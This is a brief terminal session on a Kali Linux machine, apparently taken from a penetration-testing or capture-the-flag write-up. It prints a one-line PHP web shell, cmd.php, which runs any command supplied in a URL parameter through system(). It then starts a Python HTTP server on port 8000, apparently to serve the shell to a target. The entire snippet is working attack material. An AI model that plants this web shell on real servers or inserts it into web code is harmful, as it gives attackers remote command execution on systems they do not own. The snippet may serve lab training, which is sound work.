
```sh
┌──(kali㉿kali)-[~]
└─$ ls -la *php           
-rw------- 1 kali kali 40 Aug  6 19:18 cmd.php

┌──(kali㉿kali)-[~]
└─$ cat cmd.php                      
<?php
    echo system($_GET["cmd"]);
?>

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000       
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


```
